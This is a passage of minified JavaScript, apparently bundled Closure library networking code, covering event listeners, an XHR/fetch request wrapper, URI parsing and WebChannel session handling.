Q=x.type,se=x.proxy;W.removeEventListener?W.removeEventListener(Q,se,x.capture):W.detachEvent?W.detachEvent(Oe(Q),se):W.addListener&&W.removeListener&&W.removeListener(se),(Q=it(W))?(J(Q,x),Q.h==0&&(Q.src=null,W[re]=null)):z(x)}}}function Oe(x){return x in le?le[x]:le[x]="on"+x}function Ke(x,W){if(x.da)x=!0;else{W=new q(W,this);const Q=x.listener,se=x.ha||x.src;x.fa&&Te(x),x=Q.call(se,W)}return x}function it(x){return x=x[re],x instanceof Z?x:null}var at="__closure_events_fn_"+(Math.random()*1e9>>>0);function At(x){return typeof x=="function"?x:(x[at]||(x[at]=function(W){return x.handleEvent(W)}),x[at])}function Et(){B.call(this),this.i=new Z(this),this.M=this,this.G=null}h(Et,B),Et.prototype[P]=!0,Et.prototype.removeEventListener=function(x,W,Q,se){Me(this,x,W,Q,se)};function ze(x,W){var Q,se=x.G;if(se)for(Q=[];se;se=se.G)Q.push(se);if(x=x.M,se=W.type||W,typeof W=="string")W=new U(W,x);else if(W instanceof U)W.target=W.target||x;else{var ve=W;W=new U(se,x),G(W,ve)}ve=!0;let Ie,Je;if(Q)for(Je=Q.length-1;Je>=0;Je--)Ie=W.g=Q[Je],ve=Re(Ie,se,!0,W)&&ve;if(Ie=W.g=x,ve=Re(Ie,se,!0,W)&&ve,ve=Re(Ie,se,!1,W)&&ve,Q)for(Je=0;Je<Q.length;Je++)Ie=W.g=Q[Je],ve=Re(Ie,se,!1,W)&&ve}Et.prototype.N=function(){if(Et.Z.N.call(this),this.i){var x=this.i;for(const W in x.g){const Q=x.g[W];for(let se=0;se<Q.length;se++)z(Q[se]);delete x.g[W],x.h--}}this.G=null},Et.prototype.J=function(x,W,Q,se){return this.i.add(String(x),W,!1,Q,se)},Et.prototype.K=function(x,W,Q,se){return this.i.add(String(x),W,!0,Q,se)};function Re(x,W,Q,se){if(W=x.i.g[String(W)],!W)return!0;W=W.concat();let ve=!0;for(let Ie=0;Ie<W.length;++Ie){const Je=W[Ie];if(Je&&!Je.da&&Je.capture==Q){const Zt=Je.listener,li=Je.ha||Je.src;Je.fa&&J(x.i,Je),ve=Zt.call(li,se)!==!1&&ve}}return ve&&!se.defaultPrevented}function xn(x,W){if(typeof x!="function")if(x&&typeof x.handleEvent=="function")x=l(x.handleEvent,x);else throw Error("Invalid listener argument");return Number(W)>2147483647?-1:o.setTimeout(x,W||0)}function Ln(x){x.g=xn(()=>{x.g=null,x.i&&(x.i=!1,Ln(x))},x.l);const W=x.h;x.h=null,x.m.apply(null,W)}class Nn extends B{constructor(W,Q){super(),this.m=W,this.l=Q,this.h=null,this.i=!1,this.g=null}j(W){this.h=arguments,this.g?this.i=!0:Ln(this)}N(){super.N(),this.g&&(o.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function Ne(x){B.call(this),this.h=x,this.g={}}h(Ne,B);var Ve=[];function Qe(x){$(x.g,function(W,Q){this.g.hasOwnProperty(Q)&&Te(W)},x),x.g={}}Ne.prototype.N=function(){Ne.Z.N.call(this),Qe(this)},Ne.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var dt=o.JSON.stringify,cr=o.JSON.parse,ui=class{stringify(x){return o.JSON.stringify(x,void 0)}parse(x){return o.JSON.parse(x,void 0)}};function ks(){}function eo(){}var Hr={OPEN:"a",hb:"b",ERROR:"c",tb:"d"};function xr(){U.call(this,"d")}h(xr,U);function Vi(){U.call(this,"c")}h(Vi,U);var br={},ic=null;function Xc(){return ic=ic||new Et}br.Ia="serverreachability";function th(x){U.call(this,br.Ia,x)}h(th,U);function To(x){const W=Xc();ze(W,new th(W))}br.STAT_EVENT="statevent";function sc(x,W){U.call(this,br.STAT_EVENT,x),this.stat=W}h(sc,U);function wr(x){const W=Xc();ze(W,new sc(W,x))}br.Ja="timingevent";function xo(x,W){U.call(this,br.Ja,x),this.size=W}h(xo,U);function Io(x,W){if(typeof x!="function")throw Error("Fn must not be null and must be a function");return o.setTimeout(function(){x()},W)}function as(){this.g=!0}as.prototype.ua=function(){this.g=!1};function g0(x,W,Q,se,ve,Ie){x.info(function(){if(x.g)if(Ie){var Je="",Zt=Ie.split("&");for(let $n=0;$n<Zt.length;$n++){var li=Zt[$n].split("=");if(li.length>1){const Dr=li[0];li=li[1];const dc=Dr.split("_");Je=dc.length>=2&&dc[1]=="type"?Je+(Dr+"="+li+"&"):Je+(Dr+"=redacted&")}}}else Je=null;else Je=Ie;return"XMLHTTP REQ ("+se+") [attempt "+ve+"]: "+W+`
`+Q+`
`+Je})}function el(x,W,Q,se,ve,Ie,Je){x.info(function(){return"XMLHTTP RESP ("+se+") [ attempt "+ve+"]: "+W+`
`+Q+`
`+Ie+" "+Je})}function Ro(x,W,Q,se){x.info(function(){return"XMLHTTP TEXT ("+W+"): "+eu(x,Q)+(se?" "+se:"")})}function to(x,W){x.info(function(){return"TIMEOUT: "+W})}as.prototype.info=function(){};function eu(x,W){if(!x.g)return W;if(!W)return null;try{const Ie=JSON.parse(W);if(Ie){for(x=0;x<Ie.length;x++)if(Array.isArray(Ie[x])){var Q=Ie[x];if(!(Q.length<2)){var se=Q[1];if(Array.isArray(se)&&!(se.length<1)){var ve=se[0];if(ve!="noop"&&ve!="stop"&&ve!="close")for(let Je=1;Je<se.length;Je++)se[Je]=""}}}}return dt(Ie)}catch{return W}}var tu={NO_ERROR:0,cb:1,qb:2,pb:3,kb:4,ob:5,rb:6,Ga:7,TIMEOUT:8,ub:9},ya={ib:"complete",Fb:"success",ERROR:"error",Ga:"abort",xb:"ready",yb:"readystatechange",TIMEOUT:"timeout",sb:"incrementaldata",wb:"progress",lb:"downloadprogress",Nb:"uploadprogress"},ba;function wa(){}h(wa,ks),wa.prototype.g=function(){return new XMLHttpRequest},ba=new wa;function va(x){return encodeURIComponent(String(x))}function nh(x){var W=1;x=x.split(":");const Q=[];for(;W>0&&x.length;)Q.push(x.shift()),W--;return x.length&&Q.push(x.join(":")),Q}function cs(x,W,Q,se){this.j=x,this.i=W,this.l=Q,this.S=se||1,this.V=new Ne(this),this.H=45e3,this.J=null,this.o=!1,this.u=this.B=this.A=this.M=this.F=this.T=this.D=null,this.G=[],this.g=null,this.C=0,this.m=this.v=null,this.X=-1,this.K=!1,this.P=0,this.O=null,this.W=this.L=this.U=this.R=!1,this.h=new no}function no(){this.i=null,this.g="",this.h=!1}var Ir={},Jr={};function Ds(x,W,Q){x.M=1,x.A=rl(Xr(W)),x.u=Q,x.R=!0,nu(x,null)}function nu(x,W){x.F=Date.now(),Po(x),x.B=Xr(x.A);var Q=x.B,se=x.S;Array.isArray(se)||(se=[String(se)]),uh(Q.i,"t",se),x.C=0,Q=x.j.L,x.h=new no,x.g=y5(x.j,Q?W:null,!x.u),x.P>0&&(x.O=new Nn(l(x.Y,x,x.g),x.P)),W=x.V,Q=x.g,se=x.ba;var ve="readystatechange";Array.isArray(ve)||(ve&&(Ve[0]=ve.toString()),ve=Ve);for(let Ie=0;Ie<ve.length;Ie++){const Je=oe(Q,ve[Ie],se||W.handleEvent,!1,W.h||W);if(!Je)break;W.g[Je.key]=Je}W=x.J?L(x.J):{},x.u?(x.v||(x.v="POST"),W["Content-Type"]="application/x-www-form-urlencoded",x.g.ea(x.B,x.v,x.u,W)):(x.v="GET",x.g.ea(x.B,x.v,null,W)),To(),g0(x.i,x.v,x.B,x.l,x.S,x.u)}cs.prototype.ba=function(x){x=x.target;const W=this.O;W&&su(x)==3?W.j():this.Y(x)},cs.prototype.Y=function(x){try{if(x==this.g)e:{const Zt=su(this.g),li=this.g.ya(),$n=this.g.ca();if(!(Zt<3)&&(Zt!=3||this.g&&(this.h.h||this.g.la()||ds(this.g)))){this.K||Zt!=4||li==7||(li==8||$n<=0?To(3):To(2)),No(this);var W=this.g.ca();this.X=W;var Q=tl(this);if(this.o=W==200,el(this.i,this.v,this.B,this.l,this.S,Zt,W),this.o){if(this.U&&!this.L){t:{if(this.g){var se,ve=this.g;if((se=ve.g?ve.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!N(se)){var Ie=se;break t}}Ie=null}if(x=Ie)Ro(this.i,this.l,x,"Initial handshake response via X-HTTP-Initial-Response"),this.L=!0,oc(this,x);else{this.o=!1,this.m=3,wr(12),Bs(this),us(this);break e}}if(this.R){x=!0;let Dr;for(;!this.K&&this.C<Q.length;)if(Dr=ih(this,Q),Dr==Jr){Zt==4&&(this.m=4,wr(14),x=!1),Ro(this.i,this.l,null,"[Incomplete Response]");break}else if(Dr==Ir){this.m=4,wr(15),Ro(this.i,this.l,Q,"[Invalid Chunk]"),x=!1;break}else Ro(this.i,this.l,Dr,null),oc(this,Dr);if(rh(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),Zt!=4||Q.length!=0||this.h.h||(this.m=1,wr(16),x=!1),this.o=this.o&&x,!x)Ro(this.i,this.l,Q,"[Invalid Chunked Response]"),Bs(this),us(this);else if(Q.length>0&&!this.W){this.W=!0;var Je=this.j;Je.g==this&&Je.aa&&!Je.P&&(Je.j.info("Great, no buffering proxy detected. Bytes received: "+Q.length),Nw(Je),Je.P=!0,wr(11))}}else Ro(this.i,this.l,Q,null),oc(this,Q);Zt==4&&Bs(this),this.o&&!this.K&&(Zt==4?h5(this.j,this):(this.o=!1,Po(this)))}else pd(this.g),W==400&&Q.indexOf("Unknown SID")>0?(this.m=3,wr(12)):(this.m=0,wr(13)),Bs(this),us(this)}}}catch{}finally{}};function tl(x){if(!rh(x))return x.g.la();const W=ds(x.g);if(W==="")return"";let Q="";const se=W.length,ve=su(x.g)==4;if(!x.h.i){if(typeof TextDecoder>"u")return Bs(x),us(x),"";x.h.i=new o.TextDecoder}for(let Ie=0;Ie<se;Ie++)x.h.h=!0,Q+=x.h.i.decode(W[Ie],{stream:!(ve&&Ie==se-1)});return W.length=0,x.h.g+=Q,x.C=0,x.h.g}function rh(x){return x.g?x.v=="GET"&&x.M!=2&&x.j.Aa:!1}function ih(x,W){var Q=x.C,se=W.indexOf(`
`,Q);return se==-1?Jr:(Q=Number(W.substring(Q,se)),isNaN(Q)?Ir:(se+=1,se+Q>W.length?Jr:(W=W.slice(se,se+Q),x.C=se+Q,W)))}cs.prototype.cancel=function(){this.K=!0,Bs(this)};function Po(x){x.T=Date.now()+x.H,nl(x,x.H)}function nl(x,W){if(x.D!=null)throw Error("WatchDog timer not null");x.D=Io(l(x.aa,x),W)}function No(x){x.D&&(o.clearTimeout(x.D),x.D=null)}cs.prototype.aa=function(){this.D=null;const x=Date.now();x-this.T>=0?(to(this.i,this.B),this.M!=2&&(To(),wr(17)),Bs(this),this.m=2,us(this)):nl(this,this.T-x)};function us(x){x.j.I==0||x.K||h5(x.j,x)}function Bs(x){No(x);var W=x.O;W&&typeof W.dispose=="function"&&W.dispose(),x.O=null,Qe(x.V),x.g&&(W=x.g,x.g=null,W.abort(),W.dispose())}function oc(x,W){try{var Q=x.j;if(Q.I!=0&&(Q.g==x||Ea(Q.h,x))){if(!x.L&&Ea(Q.h,x)&&Q.I==3){try{var se=Q.Ba.g.parse(W)}catch{se=null}if(Array.isArray(se)&&se.length==3){var ve=se;if(ve[0]==0){e:if(!Q.v){if(Q.g)if(Q.g.F+3e3<x.F)Ay(Q),fh(Q);else break e;I0(Q),wr(18)}}else Q.xa=ve[1],0<Q.xa-Q.K&&ve[2]<37500&&Q.F&&Q.A==0&&!Q.C&&(Q.C=Io(l(Q.Va,Q),6e3));ac(Q.h)<=1&&Q.ta&&(Q.ta=void 0)}else fl(Q,11)}else if((x.L||Q.g==x)&&Ay(Q),!N(W))for(ve=Q.Ba.g.parse(W),W=0;W<ve.length;W++){let $n=ve[W];const Dr=$n[0];if(!(Dr<=Q.K))if(Q.K=Dr,$n=$n[1],Q.I==2)if($n[0]=="c"){Q.M=$n[1],Q.ba=$n[2];const dc=$n[3];dc!=null&&(Q.ka=dc,Q.j.info("VER="+Q.ka));const hl=$n[4];hl!=null&&(Q.za=hl,Q.j.info("SVER="+Q.za));const ou=$n[5];ou!=null&&typeof ou=="number"&&ou>0&&(se=1.5*ou,Q.O=se,Q.j.info("backChannelRequestTimeoutMs_="+se)),se=Q;const au=x.g;if(au){const R0=au.g?au.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(R0){var Ie=se.h;Ie.g||R0.indexOf("spdy")==-1&&R0.indexOf("quic")==-1&&R0.indexOf("h2")==-1||(Ie.j=Ie.l,Ie.g=new Set,Ie.h&&(b0(Ie,Ie.h),Ie.h=null))}if(se.G){const Cy=au.g?au.g.getResponseHeader("X-HTTP-Session-Id"):null;Cy&&(se.wa=Cy,Fn(se.J,se.G,Cy))}}Q.I=3,Q.l&&Q.l.ra(),Q.aa&&(Q.T=Date.now()-x.F,Q.j.info("Handshake RTT: "+Q.T+"ms")),se=Q;var Je=x;if(se.na=g5(se,se.L?se.ba:null,se.W),Je.L){w0(se.h,Je);var Zt=Je,li=se.O;li&&(Zt.H=li),Zt.D&&(No(Zt),Po(Zt)),se.g=Je}else d5(se);Q.i.length>0&&dl(Q)}else $n[0]!="stop"&&$n[0]!="close"||fl(Q,7);else Q.I==3&&($n[0]=="stop"||$n[0]=="close"?$n[0]=="stop"?fl(Q,7):Rw(Q):$n[0]!="noop"&&Q.l&&Q.l.qa($n),Q.A=0)}}To(4)}catch{}}var zr=class{constructor(x,W){this.g=x,this.map=W}};function sh(x){this.l=x||10,o.PerformanceNavigationTiming?(x=o.performance.getEntriesByType("navigation"),x=x.length>0&&(x[0].nextHopProtocol=="hq"||x[0].nextHopProtocol=="h2")):x=!!(o.chrome&&o.chrome.loadTimes&&o.chrome.loadTimes()&&o.chrome.loadTimes().wasFetchedViaSpdy),this.j=x?this.l:1,this.g=null,this.j>1&&(this.g=new Set),this.h=null,this.i=[]}function y0(x){return x.h?!0:x.g?x.g.size>=x.j:!1}function ac(x){return x.h?1:x.g?x.g.size:0}function Ea(x,W){return x.h?x.h==W:x.g?x.g.has(W):!1}function b0(x,W){x.g?x.g.add(W):x.h=W}function w0(x,W){x.h&&x.h==W?x.h=null:x.g&&x.g.has(W)&&x.g.delete(W)}sh.prototype.cancel=function(){if(this.i=v0(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const x of this.g.values())x.cancel();this.g.clear()}};function v0(x){if(x.h!=null)return x.i.concat(x.h.G);if(x.g!=null&&x.g.size!==0){let W=x.i;for(const Q of x.g.values())W=W.concat(Q.G);return W}return b(x.i)}var gy=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function oh(x,W){if(x){x=x.split("&");for(let Q=0;Q<x.length;Q++){const se=x[Q].indexOf("=");let ve,Ie=null;se>=0?(ve=x[Q].substring(0,se),Ie=x[Q].substring(se+1)):ve=x[Q],W(ve,Ie?decodeURIComponent(Ie.replace(/\+/g," ")):"")}}}function ls(x){this.g=this.o=this.j="",this.u=null,this.m=this.h="",this.l=!1;let W;x instanceof ls?(this.l=x.l,Ei(this,x.j),this.o=x.o,this.g=x.g,ru(this,x.u),this.h=x.h,E0(this,vy(x.i)),this.m=x.m):x&&(W=String(x).match(gy))?(this.l=!1,Ei(this,W[1]||"",!0),this.o=cc(W[2]||""),this.g=cc(W[3]||"",!0),ru(this,W[4]),this.h=cc(W[5]||"",!0),E0(this,W[6]||"",!0),this.m=cc(W[7]||"")):(this.l=!1,this.i=new iu(null,this.l))}ls.prototype.toString=function(){const x=[];var W=this.j;W&&x.push(dd(W,ah,!0),":");var Q=this.g;return(Q||W=="file")&&(x.push("//"),(W=this.o)&&x.push(dd(W,ah,!0),"@"),x.push(va(Q).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),Q=this.u,Q!=null&&x.push(":",String(Q))),(Q=this.h)&&(this.g&&Q.charAt(0)!="/"&&x.push("/"),x.push(dd(Q,Q.charAt(0)=="/"?ch:yy,!0))),(Q=this.i.toString())&&x.push("?",Q),(Q=this.m)&&x.push("#",dd(Q,by)),x.join("")},ls.prototype.resolve=function(x){const W=Xr(this);let Q=!!x.j;Q?Ei(W,x.j):Q=!!x.o,Q?W.o=x.o:Q=!!x.g,Q?W.g=x.g:Q=x.u!=null;var se=x.h;if(Q)ru(W,x.u);else if(Q=!!x.h){if(se.charAt(0)!="/")if(this.g&&!this.h)se="/"+se;else{var ve=W.h.lastIndexOf("/");ve!=-1&&(se=W.h.slice(0,ve+1)+se)}if(ve=se,ve==".."||ve==".")se="";else if(ve.indexOf("./")!=-1||ve.indexOf("/.")!=-1){se=ve.lastIndexOf("/",0)==0,ve=ve.split("/");const Ie=[];for(let Je=0;Je<ve.length;){const Zt=ve[Je++];Zt=="."?se&&Je==ve.length&&Ie.push(""):Zt==".."?((Ie.length>1||Ie.length==1&&Ie[0]!="")&&Ie.pop(),se&&Je==ve.length&&Ie.push("")):(Ie.push(Zt),se=!0)}se=Ie.join("/")}else se=ve}return Q?W.h=se:Q=x.i.toString()!=="",Q?E0(W,vy(x.i)):Q=!!x.m,Q&&(W.m=x.m),W};function Xr(x){return new ls(x)}function Ei(x,W,Q){x.j=Q?cc(W,!0):W,x.j&&(x.j=x.j.replace(/:$/,""))}function ru(x,W){if(W){if(W=Number(W),isNaN(W)||W<0)throw Error("Bad port number "+W);x.u=W}else x.u=null}function E0(x,W,Q){W instanceof iu?(x.i=W,ol(x.i,x.l)):(Q||(W=dd(W,il)),x.i=new iu(W,x.l))}function Fn(x,W,Q){x.i.set(W,Q)}function rl(x){return Fn(x,"zx",Math.floor(Math.random()*2147483648).toString(36)+Math.abs(Math.floor(Math.random()*2147483648)^Date.now()).toString(36)),x}function cc(x,W){return x?W?decodeURI(x.replace(/%25/g,"%2525")):decodeURIComponent(x):""}function dd(x,W,Q){return typeof x=="string"?(x=encodeURI(x).replace(W,js),Q&&(x=x.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),x):null}function js(x){return x=x.charCodeAt(0),"%"+(x>>4&15).toString(16)+(x&15).toString(16)}var ah=/[#\/\?@]/g,yy=/[#\?:]/g,ch=/[#\?]/g,il=/[#\?@]/g,by=/#/g;function iu(x,W){this.h=this.g=null,this.i=x||null,this.j=!!W}function Ms(x){x.g||(x.g=new Map,x.h=0,x.i&&oh(x.i,function(W,Q){x.add(decodeURIComponent(W.replace(/\+/g," ")),Q)}))}t=iu.prototype,t.add=function(x,W){Ms(this),this.i=null,x=sl(this,x);let Q=this.g.get(x);return Q||this.g.set(x,Q=[]),Q.push(W),this.h+=1,this};function wy(x,W){Ms(x),W=sl(x,W),x.g.has(W)&&(x.i=null,x.h-=x.g.get(W).length,x.g.delete(W))}function _0(x,W){return Ms(x),W=sl(x,W),x.g.has(W)}t.forEach=function(x,W){Ms(this),this.g.forEach(function(Q,se){Q.forEach(function(ve){x.call(W,ve,se,this)},this)},this)};function A0(x,W){Ms(x);let Q=[];if(typeof W=="string")_0(x,W)&&(Q=Q.concat(x.g.get(sl(x,W))));else for(x=Array.from(x.g.values()),W=0;W<x.length;W++)Q=Q.concat(x[W]);return Q}t.set=function(x,W){return Ms(this),this.i=null,x=sl(this,x),_0(this,x)&&(this.h-=this.g.get(x).length),this.g.set(x,[W]),this.h+=1,this},t.get=function(x,W){return x?(x=A0(this,x),x.length>0?String(x[0]):W):W};function uh(x,W,Q){wy(x,W),Q.length>0&&(x.i=null,x.g.set(sl(x,W),b(Q)),x.h+=Q.length)}t.toString=function(){if(this.i)return this.i;if(!this.g)return"";const x=[],W=Array.from(this.g.keys());for(let se=0;se<W.length;se++){var Q=W[se];const ve=va(Q);Q=A0(this,Q);for(let Ie=0;Ie<Q.length;Ie++){let Je=ve;Q[Ie]!==""&&(Je+="="+va(Q[Ie])),x.push(Je)}}return this.i=x.join("&")};function vy(x){const W=new iu;return W.i=x.i,x.g&&(W.g=new Map(x.g),W.h=x.h),W}function sl(x,W){return W=String(W),x.j&&(W=W.toLowerCase()),W}function ol(x,W){W&&!x.j&&(Ms(x),x.i=null,x.g.forEach(function(Q,se){const ve=se.toLowerCase();se!=ve&&(wy(this,se),uh(this,ve,Q))},x)),x.j=W}function _a(x,W){const Q=new as;if(o.Image){const se=new Image;se.onload=f(Oo,Q,"TestLoadImage: loaded",!0,W,se),se.onerror=f(Oo,Q,"TestLoadImage: error",!1,W,se),se.onabort=f(Oo,Q,"TestLoadImage: abort",!1,W,se),se.ontimeout=f(Oo,Q,"TestLoadImage: timeout",!1,W,se),o.setTimeout(function(){se.ontimeout&&se.ontimeout()},1e4),se.src=x}else W(!1)}function C0(x,W){const Q=new as,se=new AbortController,ve=setTimeout(()=>{se.abort(),Oo(Q,"TestPingServer: timeout",!1,W)},1e4);fetch(x,{signal:se.signal}).then(Ie=>{clearTimeout(ve),Ie.ok?Oo(Q,"TestPingServer: ok",!0,W):Oo(Q,"TestPingServer: server error",!1,W)}).catch(()=>{clearTimeout(ve),Oo(Q,"TestPingServer: error",!1,W)})}function Oo(x,W,Q,se,ve){try{ve&&(ve.onload=null,ve.onerror=null,ve.onabort=null,ve.ontimeout=null),se(Q)}catch{}}function al(){this.g=new ui}function uc(x){this.i=x.Sb||null,this.h=x.ab||!1}h(uc,ks),uc.prototype.g=function(){return new lc(this.i,this.h)};function lc(x,W){Et.call(this),this.H=x,this.o=W,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.A=new Headers,this.h=null,this.F="GET",this.D="",this.g=!1,this.B=this.j=this.l=null,this.v=new AbortController}h(lc,Et),t=lc.prototype,t.open=function(x,W){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.F=x,this.D=W,this.readyState=1,Aa(this)},t.send=function(x){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");if(this.v.signal.aborted)throw this.abort(),Error("Request was aborted.");this.g=!0;const W={headers:this.A,method:this.F,credentials:this.m,cache:void 0,signal:this.v.signal};x&&(W.body=x),(this.H||o).fetch(new Request(this.D,W)).then(this.Pa.bind(this),this.ga.bind(this))},t.abort=function(){this.response=this.responseText="",this.A=new Headers,this.status=0,this.v.abort(),this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),this.readyState>=1&&this.g&&this.readyState!=4&&(this.g=!1,cl(this)),this.readyState=0},t.Pa=function(x){if(this.g&&(this.l=x,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=x.headers,this.readyState=2,Aa(this)),this.g&&(this.readyState=3,Aa(this),this.g)))if(this.responseType==="arraybuffer")x.arrayBuffer().then(this.Na.bind(this),this.ga.bind(this));else if(typeof o.ReadableStream<"u"&&"body"in x){if(this.j=x.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.B=new TextDecoder;lh(this)}else x.text().then(this.Oa.bind(this),this.ga.bind(this))};function lh(x){x.j.read().then(x.Ma.bind(x)).catch(x.ga.bind(x))}t.Ma=function(x){if(this.g){if(this.o&&x.value)this.response.push(x.value);else if(!this.o){var W=x.value?x.value:new Uint8Array(0);(W=this.B.decode(W,{stream:!x.done}))&&(this.response=this.responseText+=W)}x.done?cl(this):Aa(this),this.readyState==3&&lh(this)}},t.Oa=function(x){this.g&&(this.response=this.responseText=x,cl(this))},t.Na=function(x){this.g&&(this.response=x,cl(this))},t.ga=function(){this.g&&cl(this)};function cl(x){x.readyState=4,x.l=null,x.j=null,x.B=null,Aa(x)}t.setRequestHeader=function(x,W){this.A.append(x,W)},t.getResponseHeader=function(x){return this.h&&this.h.get(x.toLowerCase())||""},t.getAllResponseHeaders=function(){if(!this.h)return"";const x=[],W=this.h.entries();for(var Q=W.next();!Q.done;)Q=Q.value,x.push(Q[0]+": "+Q[1]),Q=W.next();return x.join(`\r
`)};function Aa(x){x.onreadystatechange&&x.onreadystatechange.call(x)}Object.defineProperty(lc.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(x){this.m=x?"include":"same-origin"}});function ko(x){let W="";return $(x,function(Q,se){W+=se,W+=":",W+=Q,W+=`\r
`}),W}function fd(x,W,Q){e:{for(se in Q){var se=!1;break e}se=!0}se||(Q=ko(Q),typeof x=="string"?Q!=null&&va(Q):Fn(x,W,Q))}function Wn(x){Et.call(this),this.headers=new Map,this.L=x||null,this.h=!1,this.g=null,this.D="",this.o=0,this.l="",this.j=this.B=this.v=this.A=!1,this.m=null,this.F="",this.H=!1}h(Wn,Et);var ul=/^https?$/i,xw=["POST","PUT"];t=Wn.prototype,t.Fa=function(x){this.H=x},t.ea=function(x,W,Q,se){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+x);W=W?W.toUpperCase():"GET",this.D=x,this.l="",this.o=0,this.A=!1,this.h=!0,this.g=this.L?this.L.g():ba.g(),this.g.onreadystatechange=m(l(this.Ca,this));try{this.B=!0,this.g.open(W,String(x),!0),this.B=!1}catch(Ie){S0(this,Ie);return}if(x=Q||"",Q=new Map(this.headers),se)if(Object.getPrototypeOf(se)===Object.prototype)for(var ve in se)Q.set(ve,se[ve]);else if(typeof se.keys=="function"&&typeof se.get=="function")for(const Ie of se.keys())Q.set(Ie,se.get(Ie));else throw Error("Unknown input type for opt_headers: "+String(se));se=Array.from(Q.keys()).find(Ie=>Ie.toLowerCase()=="content-type"),ve=o.FormData&&x instanceof o.FormData,!(Array.prototype.indexOf.call(xw,W,void 0)>=0)||se||ve||Q.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[Ie,Je]of Q)this.g.setRequestHeader(Ie,Je);this.F&&(this.g.responseType=this.F),"withCredentials"in this.g&&this.g.withCredentials!==this.H&&(this.g.withCredentials=this.H);try{this.m&&(clearTimeout(this.m),this.m=null),this.v=!0,this.g.send(x),this.v=!1}catch(Ie){S0(this,Ie)}};function S0(x,W){x.h=!1,x.g&&(x.j=!0,x.g.abort(),x.j=!1),x.l=W,x.o=5,Iw(x),hd(x)}function Iw(x){x.A||(x.A=!0,ze(x,"complete"),ze(x,"error"))}t.abort=function(x){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.o=x||7,ze(this,"complete"),ze(this,"abort"),hd(this))},t.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),hd(this,!0)),Wn.Z.N.call(this)},t.Ca=function(){this.u||(this.B||this.v||this.j?T0(this):this.Xa())},t.Xa=function(){T0(this)};function T0(x){if(x.h&&typeof s<"u"){if(x.v&&su(x)==4)setTimeout(x.Ca.bind(x),0);else if(ze(x,"readystatechange"),su(x)==4){x.h=!1;try{const Ie=x.ca();e:switch(Ie){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var W=!0;break e;default:W=!1}var Q;if(!(Q=W)){var se;if(se=Ie===0){let Je=String(x.D).match(gy)[1]||null;!Je&&o.self&&o.self.location&&(Je=o.self.location.protocol.slice(0,-1)),se=!ul.test(Je?Je.toLowerCase():"")}Q=se}if(Q)ze(x,"complete"),ze(x,"success");else{x.o=6;try{var ve=su(x)>2?x.g.statusText:""}catch{ve=""}x.l=ve+" ["+x.ca()+"]",Iw(x)}}finally{hd(x)}}}}function hd(x,W){if(x.g){x.m&&(clearTimeout(x.m),x.m=null);const Q=x.g;x.g=null,W||ze(x,"ready");try{Q.onreadystatechange=null}catch{}}}t.isActive=function(){return!!this.g};function su(x){return x.g?x.g.readyState:0}t.ca=function(){try{return su(this)>2?this.g.status:-1}catch{return-1}},t.la=function(){try{return this.g?this.g.responseText:""}catch{return""}},t.La=function(x){if(this.g){var W=this.g.responseText;return x&&W.indexOf(x)==0&&(W=W.substring(x.length)),cr(W)}};function ds(x){try{if(!x.g)return null;if("response"in x.g)return x.g.response;switch(x.F){case"":case"text":return x.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in x.g)return x.g.mozResponseArrayBuffer}return null}catch{return null}}function pd(x){const W={};x=(x.g&&su(x)>=2&&x.g.getAllResponseHeaders()||"").split(`\r
`);for(let se=0;se<x.length;se++){if(N(x[se]))continue;var Q=nh(x[se]);const ve=Q[0];if(Q=Q[1],typeof Q!="string")continue;Q=Q.trim();const Ie=W[ve]||[];W[ve]=Ie,Ie.push(Q)}H(W,function(se){return se.join(", ")})}t.ya=function(){return this.o},t.Ha=function(){return typeof this.l=="string"?this.l:String(this.l)};function ll(x,W,Q){return Q&&Q.internalChannelParams&&Q.internalChannelParams[x]||W}function dh(x){this.za=0,this.i=[],this.j=new as,this.ba=this.na=this.J=this.W=this.g=this.wa=this.G=this.H=this.u=this.U=this.o=null,this.Ya=this.V=0,this.Sa=ll("failFast",!1,x),this.F=this.C=this.v=this.m=this.l=null,this.X=!0,this.xa=this.K=-1,this.Y=this.A=this.D=0,this.Qa=ll("baseRetryDelayMs",5e3,x),this.Za=ll("retryDelaySeedMs",1e4,x),this.Ta=ll("forwardChannelMaxRetries",2,x),this.va=ll("forwardChannelRequestTimeoutMs",2e4,x),this.ma=x&&x.xmlHttpFactory||void 0,this.Ua=x&&x.Rb||void 0,this.Aa=x&&x.useFetchStreams||!1,this.O=void 0,this.L=x&&x.supportsCrossDomainXhr||!1,this.M="",this.h=new sh(x&&x.concurrentRequestLimit),this.Ba=new al,this.S=x&&x.fastHandshake||!1,this.R=x&&x.encodeInitMessageHeaders||!1,this.S&&this.R&&(this.R=!1),this.Ra=x&&x.Pb||!1,x&&x.ua&&this.j.ua(),x&&x.forceLongPolling&&(this.X=!1),this.aa=!this.S&&this.X&&x&&x.detectBufferingProxy||!1,this.ia=void 